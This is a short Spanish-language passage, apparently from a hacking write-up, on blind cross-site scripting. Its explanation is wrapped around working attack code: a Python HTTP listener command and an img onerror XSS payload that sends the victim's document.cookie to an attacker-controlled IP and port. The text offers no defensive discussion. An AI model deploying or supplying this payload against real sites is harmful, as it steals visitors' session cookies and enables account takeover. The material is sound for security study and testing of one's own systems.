
En estos casos nos encontramos frente a una especie de xss blind, ya que no lo podemos testear personalmente, solo nos  queda crear un servidor python de la siguiente manera:

```ruby
python -m http.server 1234 
```

Ahora enviar un a carga util XSS de la siguiente forma: 

```html
<img src="x" onerror="fetch('http://{IP}:{PUERTO}/' + document.cookie ) ">
```

De esta forma nos deberia llegar  una peticion con las cookies de quien carga este codigo.
